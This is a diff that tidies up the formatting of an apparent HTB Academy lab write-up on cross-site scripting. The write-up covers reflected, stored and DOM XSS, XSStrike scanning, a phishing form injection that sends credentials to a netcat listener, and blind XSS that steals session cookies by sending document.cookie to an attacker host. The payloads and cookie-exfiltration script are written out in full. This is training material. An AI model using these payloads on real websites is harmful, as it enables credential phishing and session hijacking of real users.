@@ -79,13 +79,15 @@ In this module, we dissect Reflected, Stored, and DOM-based XSS vectors. We craf
 #### Technical Methodology & Exploit Execution:
 
 first, lets open the website in the browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 We can add some tasks.
 
 To get the cookie, we will add the following 'task':
+```html
 <script>alert(document.cookie)</script>
+```
 
 ![Figure 1.1 — Lab execution and output verification (Page 1)](/assets/images/posts/htb-academy/cross-site-scripting-xss/p001_01.jpg)
 *_Figure 1.1 — Lab execution and output verification (Page 1)_*
@@ -106,10 +108,9 @@ To get the cookie, we will add the following 'task':
 
 in this question we will get to the same looking website as before,
 and we will enter to the input box this payload:
-<div></div><ul class="list-unstyled" id="todo"><div
-style="padding-left:25px">Task
-'<script>alert(document.cookie)</script>' could not be
-added.</div></ul>
+```html
+<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(document.cookie)</script>' could not be added.</div></ul>
+```
 
 ![Figure 2.1 — Lab execution and output verification (Page 2)](/assets/images/posts/htb-academy/cross-site-scripting-xss/p002_01.jpg)
 *_Figure 2.1 — Lab execution and output verification (Page 2)_*
@@ -132,7 +133,9 @@ added.</div></ul>
 #### Technical Methodology & Exploit Execution:
 
 the 'task' we will add to the website input box is:
-<img src="" onerror=alert(document.cookie)>
+```html
+<img src="" onerror="alert(document.cookie)">
+```
 
 ![Figure 3.1 — Lab execution and output verification (Page 3)](/assets/images/posts/htb-academy/cross-site-scripting-xss/p003_01.jpg)
 *_Figure 3.1 — Lab execution and output verification (Page 3)_*
@@ -154,13 +157,13 @@ the 'task' we will add to the website input box is:
 in this section we get to a new website:
 
 Which have 4 different input parameters, and we need to determine which one
-is XXS vulnerable.
+is XSS vulnerable.
 Lets use burpsuite to intercept registration request to see what are the
 parameters names:
 
 The parameters names are 'fullname', 'username', 'password', 'email'.
 
-Now, lets use an automated tool called 'XXStrike' to determine which one of
+Now, lets use an automated tool called 'XSStrike' to determine which one of
 those parameter is vulnerable. Lets download and install it to our pwnbox:
 
 ![Figure 4.1 — Lab execution and output verification (Page 4)](/assets/images/posts/htb-academy/cross-site-scripting-xss/p004_01.jpg)
@@ -176,8 +179,8 @@ those parameter is vulnerable. Lets download and install it to our pwnbox:
 git clone https://github.com/s0md3v/XSStrike.git;
 ```bash
 cd XSStrike;
-```
 pip install -r requirements.txt;
+```
 
 
 *
@@ -186,10 +189,9 @@ pip install -r requirements.txt;
 
 Now we are ready to run the tool:
 ```bash
-python xsstrike.py -u "http://<target-IP>:<target-
-```
-port>?fullname=jonsnow&username=jonsnow&password=winterfell&
+python xsstrike.py -u "http://<target-IP>:<target-port>?fullname=jonsnow&username=jonsnow&password=winterfell&
 email=jonsnow@winterfell.com"
+```
 
 ![Figure 5.1 — Lab execution and output verification (Page 5)](/assets/images/posts/htb-academy/cross-site-scripting-xss/p005_01.jpg)
 *_Figure 5.1 — Lab execution and output verification (Page 5)_*
@@ -205,7 +207,7 @@ email=jonsnow@winterfell.com"
 
 #### Technical Methodology & Exploit Execution:
 
-the screenshot on the tool execution above found a Reflection XXS (as
+the screenshot on the tool execution above found a Reflected XSS (as
 we can see on the marked area of the screenshot)
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/cross-site-scripting-xss/p006_01.png)
@@ -224,7 +226,7 @@ we can see on the marked area of the screenshot)
 
 for this question we are provided with the path '/phishing' – for the
 target server website at:
-http://<target-IP>/phishing
+`http://<target-IP>/phishing`
 
 
 
@@ -254,7 +256,7 @@ the html angular brackets):
 
 
 Now, lets load the next page:
-http://<target-IP>/phishing/send.php
+`http://<target-IP>/phishing/send.php`
 
 
 It can take it any URL.
@@ -281,11 +283,9 @@ nc -lnvp 8081
 Now, as the netcat running – we copy the index.php modifed URL (after the
 html injection:
 
-http://<target-
-IP>/phishing/index.php?url=document.write%28%27%3Ch3%3EPleas
+`http://<target-IP>/phishing/index.php?url=document.write%28%27%3Ch3%3EPleas`
 e+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F
-<attacker-
-IP>%3A8081%3E%3Cinput+type%3D%22username%22+name%3D%22userna
+`<attacker-IP>`%3A8081%3E%3Cinput+type%3D%22username%22+name%3D%22userna
 me%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22pass
 word%22+name%3D%22password%22+placeholder%3D%22Password%22%3
 E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%2
@@ -308,7 +308,7 @@ On the send.php we may get 'Issue in sending URL!', but on the netcat listener:
 We get credentials! 'admin:p1zd0nt57341myp455'.
 
 Now lets go to
-http://<target-IP>/phishing/login.php
+`http://<target-IP>/phishing/login.php`
 
 
 And login with the obtained credentials
@@ -334,7 +334,7 @@ And login with the obtained credentials
 #### Technical Methodology & Exploit Execution:
 
 in this question – we go to '/hijacking' path:
-http://<target-IP>/hijacking
+`http://<target-IP>/hijacking`
 
 
 We get to a registration page with 5 parameters
@@ -349,14 +349,14 @@ Lets try to make a registration:
 
 Upon registration..
 
-The conclusion from this request – that whatever XXS attempts we perform on
+The conclusion from this request – that whatever XSS attempts we perform on
 the inputs – it will not be displayed for us. So we can not just throw 'alert' to
-check what input field is XXS vulnerable. We will have to use something more
-elobarated.
+check what input field is XSS vulnerable. We will have to use something more
+elaborated.
 
-For that we will inject html script that contains javascript which sends a request
-to us. From whatever input put the request and receive a request – we know its
-XXS vulnerable.
+For that we will inject an HTML script that contains JavaScript which sends a request
+to us. From whatever input field triggers the request – we know it is
+XSS vulnerable.
 
 First we start netcat listener on port 8081:
 ```bash
@@ -377,17 +377,15 @@ nc -lnvp 8081
 ### Here is the request at how its seen in burpsuite
 
 Now – we enter the following payload to every input field one by one:
-<script src=http://[attaker-IP]:8081></script>
-'><script src=http://[attaker-IP]:8081></script>
-"><script src=http://[attaker-IP]:8081></script>
-javascript:eval('var
-a=document.createElement(\'script\');a.src=\'http://[attaker
--IP]:8081\';document.body.appendChild(a)')
-<script>function b(){eval(this.responseText)};a=new
-XMLHttpRequest();a.addEventListener("load", b);a.open("GET",
-"//[attaker-IP]:8081");a.send();</script>
-<script>$.getScript("http://[attaker-IP]:8081")</script>
+```html
+<script src="http://[attacker-IP]:8081"></script>
+'><script src="http://[attacker-IP]:8081"></script>
+"><script src="http://[attacker-IP]:8081"></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://[attacker-IP]:8081\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//[attacker-IP]:8081");a.send();</script>
+<script>$.getScript("http://[attacker-IP]:8081")</script>
 Until we see a incoming traffic to our netcat listener .
+```
 
 Now – I will tell you upfront that the vulnerable input field is the 'Profile Picture
 URL' field.
@@ -413,8 +411,7 @@ First we have to create some files on the pwnbox:
 Lets start with index.js:
 touch index.js
 in it we put the content:
-new Image().src='http://<attacker-
-IP>:8081/index.php?c='+document.cookie
+new Image().src='http://`<attacker-IP>`:8081/index.php?c='+document.cookie
 
 
 
@@ -451,17 +448,14 @@ sudo php -S 0.0.0.0:8081
 
 Now that the php listener in on, lets inject to the image URL the following
 payload:
-<script src=http://[attacker-IP]:8081/index.js></script>
-'><script src=http://[attacker-IP]:8081/index.js></script>
-"><script src=http://[attacker-IP]:8081/index.js></script>
-javascript:eval('var
-a=document.createElement(\'script\');a.src=\'http://[attacke
-r-IP]:8081/index.js\';document.body.appendChild(a)')
-<script>function b(){eval(this.responseText)};a=new
-XMLHttpRequest();a.addEventListener("load", b);a.open("GET",
-"//[attacker-IP]:8081/index.js");a.send();</script>
-<script>$.getScript("http://[attacker-
-IP]:8081/index.js")</script>
+```html
+<script src="http://[attacker-IP]:8081/index.js"></script>
+'><script src="http://[attacker-IP]:8081/index.js"></script>
+"><script src="http://[attacker-IP]:8081/index.js"></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://[attacker-IP]:8081/index.js\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//[attacker-IP]:8081/index.js");a.send();</script>
+<script>$.getScript("http://[attacker-IP]:8081/index.js")</script>
+```
 *make sure to replace all 6 occurrences of '[attacker-IP]' with your own
 attacker IP . *
 
@@ -481,7 +475,7 @@ We have the cookie! 'cookie=c00k1355h0u1d8353cu23d'
 But there will be some errors in communication. *
 
 Now that we have the cookie – lets go to
-http://<target-IP>/hijacking/login.php
+`http://<target-IP>/hijacking/login.php`
 
 
 Lets insert the cookie in the firefox cookie editor:
@@ -534,7 +528,7 @@ And restart the browser. **
 
 for the skills assessment – we are provided with the '/assessment'
 folder to investigate:
-http://<target-IP>/assessment
+`http://<target-IP>/assessment`
 we get to this security blog page:
 
 Further down
@@ -553,14 +547,13 @@ there is the Recent Post 'Welcome to Security Blog', lets enter it:
 
 I will tell you directly that the vulnerable input field is the Website.
 We will have to retrace our steps from 'Session Hijacking' section to exploit the
-XXS vulnerable input field – which means setting up index.js, index.php, and
+XSS vulnerable input field – which means setting up index.js, index.php, and
 ```bash
 run php listener .
 ```
 
 index.js:
-new Image().src='http://<attacker-
-IP>:8081/index.php?c='+document.cookie
+new Image().src='http://`<attacker-IP>`:8081/index.php?c='+document.cookie
 
 ![Figure 19.1 — Lab execution and output verification (Page 19)](/assets/images/posts/htb-academy/cross-site-scripting-xss/p019_01.jpg)
 *_Figure 19.1 — Lab execution and output verification (Page 19)_*
@@ -609,7 +602,9 @@ sudo php -S 0.0.0.0:8081
 Now that everything in the receiver side is ready – lets 'leave a comment'.
 The Comment, Name and Email can be normal input values. For the Website
 however, our input will be the following:
-<script src=http://10.10.14.129:8081/index.js>
+```html
+<script src="http://10.10.14.129:8081/index.js"></script>
+```
 
 
 
